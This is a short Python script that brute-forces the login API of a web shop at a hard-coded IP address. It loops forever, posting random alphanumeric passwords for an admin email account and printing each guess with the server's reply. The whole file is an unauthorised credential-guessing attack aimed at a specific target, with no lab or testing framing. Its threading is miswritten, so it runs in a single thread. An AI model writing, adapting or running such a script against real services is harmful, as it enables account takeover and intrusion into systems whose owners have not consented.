import requests
import random
from threading import Thread

url = "http://167.86.87.154:8080/api/v1/auth/login"
AmountOfChars = 1
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
username = "admin@webshop.nl"


def send_request(username, password):
    data = {
        "email": username,
        "password": password
    }
    r = requests.post(url, json=data)
    return r

def bruteForce():
    while True:
        randomGuess = random.choices(chars, k=random.randint(1, 10))
        randomPass = "".join(randomGuess)

        r = send_request(username, randomPass)
        print(randomPass)
        print(r.content)

if __name__ == '__main__':
    for x in range(10):
        Thread(target=bruteForce()).start()


